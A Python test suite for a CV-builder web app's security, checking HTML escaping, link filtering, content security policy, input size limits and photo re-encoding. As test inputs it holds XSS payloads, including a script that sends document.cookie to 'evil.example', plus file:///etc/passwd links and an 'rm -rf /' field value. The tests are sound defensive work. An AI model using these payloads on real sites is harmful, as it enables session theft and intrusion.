"""The checks that matter when the app is exposed to the internet.

Run them from web/:

    pip install -r requirements.txt pytest
    python -m pytest

The one test that actually starts a browser is opt-in, because it needs Chrome
installed and takes a couple of seconds:

    CV_TEST_RENDER=1 python -m pytest
"""

from __future__ import annotations

import base64
import io
import os
import re
import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import photo as photo_lib  # noqa: E402
from app import app  # noqa: E402
from cvdoc import CV, build_document  # noqa: E402

client = TestClient(app)

MINIMAL = {"name": "Someone", "role": "Some Role"}


def document(**fields) -> str:
    return build_document(CV.model_validate({**MINIMAL, **fields}))


# --------------------------------------------------------------- escaping

def test_script_in_a_field_does_not_become_a_script():
    doc = document(about="<script>fetch('http://evil.example/'+document.cookie)</script>")
    assert "<script>fetch" not in doc
    assert "&lt;script&gt;fetch" in doc
    # The page-height script is the only one in the document, and it carries
    # the nonce the CSP demands.
    assert len(re.findall(r"<script", doc)) == 1
    assert re.search(r'<script nonce="[A-Za-z0-9_-]{16,}">', doc)


def test_img_tag_pointing_at_a_local_file_stays_text():
    doc = document(interests='<img src="file:///etc/passwd" onerror="alert(1)">')
    assert '<img src="file:' not in doc
    # The characters survive as text; what must not exist is a live attribute,
    # which needs an unescaped quote after the '='.
    assert 'onerror="' not in doc
    assert "&lt;img src=&quot;file:///etc/passwd&quot; onerror=&quot;alert(1)&quot;&gt;" in doc


def test_attribute_break_out_is_escaped():
    doc = document(name='" onload="alert(1)')
    assert 'onload="alert(1)' not in doc
    assert "&quot;" in doc


@pytest.mark.parametrize("url", [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "ftp://example.com/x",
    "  javascript:alert(1)  ",
])
def test_non_http_links_are_dropped(url):
    doc = document(links=[{"label": "Site", "url": url}])
    assert "javascript:" not in doc
    assert "file://" not in doc
    assert "<a href=" not in doc


def test_http_links_survive():
    doc = document(links=[{"label": "GitHub", "url": "https://github.com/example"}])
    assert '<a href="https://github.com/example">' in doc


def test_bold_marker_cannot_be_used_to_inject():
    doc = document(about="**<b>x</b>**")
    # The emphasis runs after escaping, so the only tag it can produce is its own.
    assert "<strong>&lt;b&gt;x&lt;/b&gt;</strong>" in doc


def test_document_declares_a_policy_that_blocks_everything_external():
    doc = document()
    policy = re.search(r'Content-Security-Policy" content="([^"]+)"', doc).group(1)
    assert "default-src 'none'" in policy
    assert "img-src data:" in policy          # no file://, no http
    assert "script-src 'nonce-" in policy     # no inline script but ours


# ------------------------------------------------------------------ caps

@pytest.mark.parametrize("payload,where", [
    ({"jobs": [{"title": "x"}] * 21}, "jobs"),
    ({"skills": ["s"] * 41}, "skills"),
    ({"jobs": [{"title": "x", "groups": [{"label": "g", "bullets": ["b"] * 21}]}]}, "bullets"),
    ({"name": "x" * 121}, "name"),
    ({"about": "x" * 1501}, "about"),
])
def test_oversized_payloads_are_refused(payload, where):
    response = client.post("/api/preview", json={**MINIMAL, **payload})
    assert response.status_code == 422
    assert where in response.json()["error"]


def test_unknown_fields_are_refused():
    response = client.post("/api/preview", json={**MINIMAL, "cmd": "rm -rf /"})
    assert response.status_code == 422


def test_validation_errors_do_not_echo_what_was_sent():
    secret = "correct-horse-battery-staple"
    response = client.post("/api/preview", json={**MINIMAL, "about": secret * 200})
    assert response.status_code == 422
    assert secret not in response.text


def test_oversized_body_is_refused_before_parsing():
    response = client.post(
        "/api/preview",
        content=b"{}",
        headers={"Content-Type": "application/json", "Content-Length": str(50 * 1024 * 1024)},
    )
    assert response.status_code == 413


# ----------------------------------------------------------------- photos

def _png(size=(60, 40), colour=(200, 30, 30)) -> bytes:
    buffer = io.BytesIO()
    Image.new("RGB", size, colour).save(buffer, format="PNG")
    return buffer.getvalue()


def test_uploaded_image_comes_back_as_our_own_jpeg():
    response = client.post("/api/photo", files={"file": ("x.png", _png(), "image/png")})
    assert response.status_code == 200
    uri = response.json()["photo"]
    assert uri.startswith("data:image/jpeg;base64,")
    decoded = Image.open(io.BytesIO(base64.b64decode(uri.split(",", 1)[1])))
    assert decoded.format == "JPEG"
    assert decoded.size == (photo_lib.SIZE, photo_lib.SIZE)


def test_payload_appended_to_a_valid_image_is_dropped():
    raw = _png() + b"<script>alert(1)</script>" + os.urandom(64)
    cleaned = base64.b64decode(photo_lib.to_data_uri(raw).split(",", 1)[1])
    assert b"<script>" not in cleaned


def test_exif_is_not_carried_through():
    source = Image.new("RGB", (80, 80), (10, 10, 10))
    exif = source.getexif()
    exif[0x9286] = "gps and camera serial live here"  # UserComment
    buffer = io.BytesIO()
    source.save(buffer, format="JPEG", exif=exif)
    cleaned = base64.b64decode(photo_lib.to_data_uri(buffer.getvalue()).split(",", 1)[1])
    assert b"gps and camera serial" not in cleaned


def test_a_file_that_is_not_an_image_is_refused():
    response = client.post("/api/photo", files={"file": ("x.svg", b"<svg onload=alert(1)>", "image/svg+xml")})
    assert response.status_code == 400
    assert "not an image" in response.json()["error"]


def test_oversized_image_is_refused():
    with pytest.raises(photo_lib.PhotoError):
        photo_lib.to_data_uri(b"\xff" * (photo_lib.MAX_UPLOAD + 1))


@pytest.mark.parametrize("photo", [
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "file:///etc/passwd",
    "data:image/jpeg;base64,not valid base64!!",
])
def test_foreign_photo_values_never_reach_the_document(photo):
    response = client.post("/api/preview", json={**MINIMAL, "photo": photo})
    assert response.status_code in (400, 422)


def test_a_photo_posted_straight_to_the_api_is_re_encoded():
    """/api/photo is not the only door, so /api/render re-encodes too."""
    smuggled = "data:image/jpeg;base64," + base64.b64encode(
        _png() + b"trailing-payload"
    ).decode()
    # PNG bytes labelled as JPEG: accepted by the shape check, then re-encoded.
    response = client.post("/api/preview", json={**MINIMAL, "photo": smuggled})
    assert response.status_code == 200
    assert "trailing-payload" not in response.json()["html"]


# ------------------------------------------------------------------ misc

def test_rate_limit_kicks_in():
    from app import RATE_LIMIT, _hits
    _hits.clear()
    codes = [client.post("/api/preview", json=MINIMAL).status_code for _ in range(RATE_LIMIT + 3)]
    _hits.clear()
    assert 429 in codes
    assert codes.count(200) <= RATE_LIMIT


def test_the_template_is_the_one_the_cli_uses():
    """The web app must not quietly fork the template."""
    from cvdoc import TEMPLATE
    assert TEMPLATE.name == "template.html"
    assert TEMPLATE.parent == Path(__file__).resolve().parents[2]


@pytest.mark.skipif(os.environ.get("CV_TEST_RENDER") != "1", reason="needs Chrome; set CV_TEST_RENDER=1")
def test_render_produces_one_page_and_leaves_nothing_behind():
    import tempfile

    before = set(Path(tempfile.gettempdir()).glob("cv-render-*"))
    response = client.post("/api/render", json={
        **MINIMAL,
        "about": "A short summary.",
        "jobs": [{"title": "Job", "company": "Co", "when": "2024",
                  "groups": [{"label": "", "bullets": ["Did a thing."]}]}],
    })
    assert response.status_code == 200
    assert response.content.startswith(b"%PDF")
    assert b"/Count 1" in response.content
    assert response.headers["content-disposition"] == 'attachment; filename="cv.pdf"'
    assert set(Path(tempfile.gettempdir()).glob("cv-render-*")) == before
